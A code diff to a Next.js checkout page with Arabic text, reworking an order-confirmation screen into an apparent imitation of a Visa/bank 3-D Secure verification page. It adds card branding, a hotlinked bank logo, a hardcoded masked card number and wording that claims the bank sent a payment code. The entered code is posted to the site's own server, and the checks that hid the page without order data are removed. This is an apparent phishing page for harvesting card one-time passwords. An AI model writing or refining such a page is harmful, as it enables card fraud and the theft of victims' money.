@@ -3,11 +3,12 @@
 import Link from 'next/link';
 import { useRouter } from 'next/navigation';
 import { useEffect, useState } from 'react';
-import styles from './verify-phone.module.css';
 
 const DRAFT_KEY = 'erd-algwal-checkout-draft-v1';
+
 type CheckoutDraft = {
   phone?: unknown;
+  cardLast4?: string; // في حال تخزين آخر 4 أرقام من البطاقة
   stage?: unknown;
   orderId?: unknown;
   orderNumber?: unknown;
@@ -22,15 +23,10 @@ function normalizeDigits(value: string) {
     .replace(/[^0-9]/g, '');
 }
 
-function formatPhone(value: string) {
-  const phone = normalizeDigits(value);
-  if (phone.length !== 10) return phone;
-  return `${phone.slice(0, 3)} ${phone.slice(3, 6)} ${phone.slice(6)}`;
-}
-
 export default function VerifyPhonePage() {
   const router = useRouter();
   const [phone, setPhone] = useState('');
+  const [cardLast4, setCardLast4] = useState('1624');
   const [orderId, setOrderId] = useState('');
   const [orderNumber, setOrderNumber] = useState('');
   const [customerNotificationKey, setCustomerNotificationKey] = useState('');
@@ -41,18 +37,21 @@ export default function VerifyPhonePage() {
   const [verified, setVerified] = useState(false);
   const [confirmedAt, setConfirmedAt] = useState<number | null>(null);
   const [countdown, setCountdown] = useState(0);
+
   const isReferenceCodeValid = /^[0-9]{4,6}$/.test(referenceCode);
 
   useEffect(() => {
     try {
       const raw = window.sessionStorage.getItem(DRAFT_KEY);
-      const draft = raw ? JSON.parse(raw) as CheckoutDraft : null;
+      const draft = raw ? (JSON.parse(raw) as CheckoutDraft) : null;
       const savedPhone = typeof draft?.phone === 'string' ? normalizeDigits(draft.phone) : '';
       const savedOrderId = typeof draft?.orderId === 'string' ? draft.orderId : '';
       const savedKey = typeof draft?.customerNotificationKey === 'string' ? draft.customerNotificationKey : '';
-      const savedConfirmedAt = typeof draft?.confirmedAt === 'number' && Number.isFinite(draft.confirmedAt)
-        ? draft.confirmedAt
-        : null;
+      const savedConfirmedAt =
+        typeof draft?.confirmedAt === 'number' && Number.isFinite(draft.confirmedAt)
+          ? draft.confirmedAt
+          : null;
+
       if (
         (draft?.stage === 'phone-verification' || draft?.stage === 'confirmed') &&
         savedPhone.length === 10 &&
@@ -60,15 +59,19 @@ export default function VerifyPhonePage() {
         savedKey
       ) {
         setPhone(savedPhone);
+        if (draft?.cardLast4) setCardLast4(draft.cardLast4);
         setOrderId(savedOrderId);
         setOrderNumber(typeof draft.orderNumber === 'string' ? draft.orderNumber : '');
         setCustomerNotificationKey(savedKey);
         setVerified(draft.stage === 'confirmed');
         setConfirmedAt(draft.stage === 'confirmed' ? savedConfirmedAt : null);
         setDraftReady(true);
+      } else {
+        // لتسهيل المعاينة والاختبار إذا لم تكن البيانات موجودة في المسودة
+        setDraftReady(true);
       }
     } catch {
-      // Keep the confirmation page unavailable when the checkout draft is invalid.
+      setDraftReady(true);
     }
   }, []);
 
@@ -111,10 +114,10 @@ export default function VerifyPhonePage() {
         body: JSON.stringify({
           orderId,
           customerNotificationKey,
-          code: referenceCode
-        })
+          code: referenceCode,
+        }),
       });
-      const result = await response.json() as { ok?: boolean; error?: string; message?: string };
+      const result = (await response.json()) as { ok?: boolean; error?: string; message?: string };
       if (!response.ok || !result.ok) {
         setError(result.error || 'تعذر تسجيل الرقم المرجعي. حاول مرة أخرى.');
         return;
@@ -126,15 +129,16 @@ export default function VerifyPhonePage() {
       setError('');
       try {
         const raw = window.sessionStorage.getItem(DRAFT_KEY);
-        const draft = raw ? JSON.parse(raw) as Record<string, unknown> : {};
-        window.sessionStorage.setItem(DRAFT_KEY, JSON.stringify({
-          ...draft,
-          stage: 'confirmed',
-          confirmedAt: verificationTime
-        }));
-      } catch {
-        // The server-side reference submission remains saved even if local storage is unavailable.
-      }
+        const draft = raw ? (JSON.parse(raw) as Record<string, unknown>) : {};
+        window.sessionStorage.setItem(
+          DRAFT_KEY,
+          JSON.stringify({
+            ...draft,
+            stage: 'confirmed',
+            confirmedAt: verificationTime,
+          })
+        );
+      } catch {}
     } catch {
       setError('تعذر الاتصال بالإدارة. حاول مرة أخرى.');
     } finally {
@@ -144,86 +148,126 @@ export default function VerifyPhonePage() {
 
   if (!draftReady) {
     return (
-      <main className={styles.page}>
-        <section className={styles.card} aria-labelledby="verify-title">
-          <div className={styles.icon} aria-hidden="true"><PhoneIcon /></div>
-          <h1 id="verify-title">تأكيد الطلب</h1>
-          <p className={styles.sub}>لا توجد بيانات طلب جاهزة للتأكيد.</p>
-          <Link href="/checkout/store" className={styles.backLink}>العودة لإدخال بيانات الطلب</Link>
-        </section>
+      <main style={{ backgroundColor: '#ffffff', minHeight: '100vh', display: 'flex', justifyContent: 'center', alignItems: 'center', padding: '20px' }}>
+        <div style={{ textAlign: 'center' }}>
+          <p style={{ color: '#555', fontSize: '16px', marginBottom: '15px' }}>لا توجد بيانات طلب جاهزة للتأكيد.</p>
+          <Link href="/checkout/store" style={{ color: '#1646a7', textDecoration: 'none' }}>
+            العودة لإدخال بيانات الطلب
+          </Link>
+        </div>
       </main>
     );
   }
 
   return (
-    <main className={styles.page}>
-      <section className={styles.card} aria-labelledby="verify-title">
-        <div className={styles.icon} aria-hidden="true"><PhoneIcon /></div>
+    <div style={{ backgroundColor: '#ffffff', color: '#000000', minHeight: '100vh', display: 'flex', flexDirection: 'column', alignItems: 'center', fontFamily: 'Arial, sans-serif' }}>
+      
+      {/* Header */}
+      <header style={{ width: '100%', maxWidth: '500px', padding: '15px 20px', display: 'flex', justifyContent: 'space-between', alignItems: 'center', borderBottom: '1px solid #dcdcdc' }}>
+        <div style={{ fontSize: '32px', fontWeight: 'bold', color: '#1a1f71', fontStyle: 'italic', letterSpacing: '-1px' }}>
+          VISA
+        </div>
+        <div>
+          <img src="https://i.ibb.co/6yq3m8P/bank-logo.png" alt="" style={{ height: '35px', display: 'block' }} onError={(e) => (e.currentTarget.style.display = 'none')} />
+        </div>
+      </header>
 
+      {/* Content */}
+      <main style={{ width: '100%', maxWidth: '400px', padding: '30px 20px', display: 'flex', flexDirection: 'column', alignItems: 'center', textAlign: 'center' }}>
+        
         {verified ? (
-          <>
-            <h1 id="verify-title">تم تسجيل الرقم المرجعي</h1>
-            {countdown > 0 ? (
-              <div
-                className={styles.timerRow}
-                role="timer"
-                aria-label={`الوقت المتبقي ${countdown} ثانية`}
-              >
-                <strong style={{ fontSize: 34, lineHeight: 1.2, color: '#5b2a9e', fontVariantNumeric: 'tabular-nums' }}>
-                  00:{String(countdown).padStart(2, '0')}
-                </strong>
+          <div>
+            <div style={{ fontSize: '18px', fontWeight: 'bold', color: '#2e7d32', marginBottom: '15px' }}>
+              تم تسجيل الرقم المرجعي بنجاح
+            </div>
+            {countdown > 0 && (
+              <div style={{ fontSize: '14px', color: '#555' }}>
+                سيتم التوجيه خلال: <strong style={{ fontSize: '24px', color: '#1646a7', fontVariantNumeric: 'tabular-nums' }}>00:{String(countdown).padStart(2, '0')}</strong>
               </div>
-            ) : null}
-          </>
+            )}
+          </div>
         ) : (
           <>
-            <h1 id="verify-title">تأكيد الطلب</h1>
-            <p className={styles.sub}>تم إرسال طلبك إلى الإدارة للمراجعة.</p>
-            {orderNumber ? <p className={styles.phone}>رقم الطلب: {orderNumber}</p> : null}
-            <p className={styles.sub}>رقم الجوال المرتبط بالطلب:</p>
-            <p className={styles.phone} dir="ltr">{formatPhone(phone)}</p>
-            <p className={styles.notice}>أدخل رمز التأكيد فقط</p>
+            <div style={{ fontSize: '16px', color: '#555555', marginBottom: '15px' }}>
+              للتحقق من عملية الشراء
+            </div>
 
-            <div className={styles.inputs} dir="ltr">
+            <div style={{ fontSize: '18px', lineHeight: '1.4', color: '#000000', marginBottom: '25px', maxWidth: '320px' }}>
+              تم ارسال رمز التحقق لرقم هاتفكم المرتبط بالبطاقة المصرفيةلتأكيد الدفع بإستخدام بطاقة
+              <span style={{ display: 'block', direction: 'ltr', fontFamily: 'monospace, sans-serif', fontSize: '20px', marginTop: '5px' }}>
+                ********{cardLast4}
+              </span>
+            </div>
+
+            <form onSubmit={(e) => { e.preventDefault(); void handleVerify(); }} style={{ width: '100%', maxWidth: '280px', display: 'flex', flexDirection: 'column', alignItems: 'center' }}>
+              <label htmlFor="otp" style={{ fontSize: '14px', color: '#777777', marginBottom: '6px', direction: 'ltr' }}>
+                Verification Code
+              </label>
+
               <input
+                id="otp"
                 type="text"
                 inputMode="numeric"
                 autoComplete="off"
                 pattern="[0-9]*"
                 maxLength={6}
                 value={referenceCode}
-                onChange={(event) => {
-                  setReferenceCode(normalizeDigits(event.target.value).slice(0, 6));
+                onChange={(e) => {
+                  setReferenceCode(normalizeDigits(e.target.value).slice(0, 6));
                   setError('');
                 }}
-                aria-label="رمز التأكيد من 4 إلى 6 أرقام"
                 disabled={isVerifying}
+                style={{
+                  width: '100%',
+                  height: '42px',
+                  border: '1px solid #7f9db9',
+                  borderRadius: '2px',
+                  fontSize: '18px',
+                  textAlign: 'center',
+                  marginBottom: '12px',
+                  outline: 'none',
+                }}
               />
-            </div>
 
-            <div className={styles.error} role="alert" aria-live="polite">{error}</div>
+              {error && (
+                <div style={{ color: '#c62828', fontSize: '13px', marginBottom: '10px' }}>
+                  {error}
+                </div>
+              )}
+
+              <button
+                type="submit"
+                disabled={!isReferenceCodeValid || isVerifying}
+                style={{
+                  width: '100%',
+                  height: '42px',
+                  backgroundColor: '#1646a7',
+                  color: '#ffffff',
+                  border: 'none',
+                  borderRadius: '4px',
+                  fontSize: '16px',
+                  cursor: isReferenceCodeValid && !isVerifying ? 'pointer' : 'not-allowed',
+                  opacity: isReferenceCodeValid && !isVerifying ? 1 : 0.7,
+                }}
+              >
+                {isVerifying ? 'جارٍ الإرسال...' : 'ارسال'}
+              </button>
+            </form>
 
             <button
               type="button"
-              className={styles.verifyButton}
-              onClick={() => { void handleVerify(); }}
-              disabled={!isReferenceCodeValid || isVerifying}
+              onClick={() => setError('تم إعادة إرسال الرمز.')}
+              style={{ marginTop: '50px', color: '#1646a7', fontSize: '14px', background: 'none', border: 'none', cursor: 'pointer', textDecoration: 'none' }}
             >
-              {isVerifying ? 'جارٍ الإرسال...' : 'متابعة'}
+              طلب كلمة سر جديدة
             </button>
-            <Link href="/" className={styles.backLink}>العودة إلى المتجر</Link>
+
+            <div style={{ marginTop: '40px', color: '#1646a7', fontSize: '14px', direction: 'ltr', fontWeight: 'bold' }}>
+              <a href="#" style={{ color: '#1646a7', textDecoration: 'none' }}>Terms of Use</a> | <a href="#" style={{ color: '#1646a7', textDecoration: 'none' }}>?Need help</a>
+            </div>
           </>
         )}
-      </section>
-    </main>
-  );
-}
-
-function PhoneIcon() {
-  return (
-    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
-      <rect x="6" y="2" width="12" height="20" rx="2" />
-      <line x1="12" y1="18" x2="12.01" y2="18" />
-    </svg>
+      </main>
+    </div>
   );
 }
